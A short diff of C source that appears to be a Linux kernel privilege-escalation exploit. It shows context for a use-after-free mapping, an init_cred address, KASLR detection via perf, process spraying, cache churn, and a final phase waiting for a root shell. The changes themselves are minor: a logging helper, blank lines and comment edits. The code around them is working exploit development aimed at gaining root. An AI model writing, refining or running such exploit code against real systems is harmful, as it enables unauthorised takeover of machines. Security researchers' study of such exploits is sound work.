@@ -1,3 +1,5 @@
+
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -97,6 +99,12 @@ static void *uaf_map = NULL;           // persistent CPU mapping
 static uint64_t init_cred_addr = 0;
 
 static void die(const char *msg) { perror(msg); exit(1); }
+static void log_info(const char *fmt, ...) {
+    va_list args;
+    va_start(args, fmt);
+    vprintf(fmt, args);
+    va_end(args);
+}
 
 // ---------- KASLR detection (perf) ----------
 static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
@@ -235,7 +243,7 @@ static void kill_spray_children(void) {
     printf("[KILL] killed %d children\n", killed);
 }
 
-// ---------- Churn (optional) ----------
+// ---------- Churn (optional, but helps AVC) ----------
 #define CHURN_MAX_PATHS 20000
 static char churn_paths[CHURN_MAX_PATHS][160];
 static int churn_npaths = 0, churn_built = 0;
@@ -459,8 +467,6 @@ int main(int argc, char **argv) {
 
     // Ensure CPU caches are flushed (compiler barrier + optional dc civac if available)
     __sync_synchronize();
-    // If dc civac works, use it; otherwise rely on __sync_synchronize.
-    // (We'll keep it simple; __sync_synchronize is a full barrier)
 
     // ----- Phase 7: Wait for root shell via pipe -----
     printf("[*] Phase 7: Waiting for root shell...\n");
